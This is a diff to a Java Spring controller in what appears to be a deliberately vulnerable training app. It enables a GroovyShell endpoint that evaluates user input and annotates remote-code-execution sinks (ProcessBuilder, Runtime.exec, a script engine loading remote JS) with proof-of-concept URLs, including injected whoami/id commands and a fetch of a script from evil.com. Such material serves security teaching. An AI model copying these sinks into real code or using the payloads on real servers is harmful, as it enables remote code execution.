@@ -1,5 +1,6 @@
 package com.best.hello.controller;
 
+import groovy.lang.GroovyShell;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
@@ -27,9 +28,10 @@ import java.io.InputStreamReader;
 @RestController
 @RequestMapping("/RCE")
 public class RCE {
+
     /**
-     * 一、调用ProcessBuilder执行ls命令，接收参数filepath，拼接命令语句
-     * http://god.com:8888/RCE/ProcessBuilder?filepath=/tmp;whoami
+     * @vul 调用ProcessBuilder执行ls命令，接收参数filepath，拼接命令语句
+     * @poc http://god.com:8888/RCE/ProcessBuilder?filepath=/tmp;whoami
      */
     @RequestMapping("/ProcessBuilder")
     public static String cmd(String filepath) {
@@ -64,8 +66,8 @@ public class RCE {
     }
 
     /**
-     * 二、Runtime.getRuntime().exec()执行命令
-     * http://god.com:8888/RCE/runtime?cmd=id
+     * @vul 使用Runtime.getRuntime().exec()执行命令
+     * @poc http://127.0.0.1:8888/RCE/runtime?cmd=id
      */
     @RequestMapping("/runtime")
     public static String cmd2(String cmd) {
@@ -91,8 +93,8 @@ public class RCE {
     }
 
 
-    /*
-    * 这种方式不存在命令执行
+    /**
+    * @safe 这种方式不存在命令执行
     */
     @RequestMapping("/runtime2")
     public static void cmd3(String cmd) {
@@ -108,20 +110,20 @@ public class RCE {
     }
 
     /**
-    * http://god.com:8888/RCE/groovy?cmd=id
-    *
-    @GetMapping("groovy")
-    public void groovyshell(String cmd) {
-        GroovyShell groovyShell = new GroovyShell();
-        groovyShell.evaluate(cmd);
+     * @vul groovy执行命令
+     * @poc http://127.0.0.1:8888/RCE/groovy?cmd="open -a Calculator".execute()
+     */
+    @GetMapping("/groovy")
+    public void groovy(String cmd) {
+        GroovyShell shell = new GroovyShell();
+        shell.evaluate(cmd);
     }
-    */
 
 
     /**
-     * 运行远程js脚本程序进行封装
-     * http://god.com:8888/RCE/js?url=http://evil.com/java/1.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
+     * @vul 调用远程js脚本程序进行封装
+     * @poc http://god.com:8888/RCE/js?url=http://evil.com/java/1.js
+     * js代码：var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
      */
     @GetMapping("/js")
     public void jsEngine(String url) throws Exception {
